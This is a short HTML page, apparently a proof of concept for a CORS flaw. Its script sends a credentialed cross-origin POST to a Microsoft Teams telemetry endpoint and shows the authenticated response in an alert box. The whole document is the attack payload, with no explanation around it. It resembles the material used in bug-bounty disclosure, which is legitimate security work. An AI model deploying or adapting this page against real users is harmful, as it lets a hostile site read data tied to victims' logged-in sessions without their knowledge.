<html>
<script>
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        alert(xhttp.responseText);
    }
};
xhttp.open("POST", "https://teams.events.data.microsoft.com/OneCollector/1.0/?cors=true&content-type=application/x-json-stream&content-encoding=gzip", true);
xhttp.withCredentials=true;
xhttp.send();
</script>
</html>
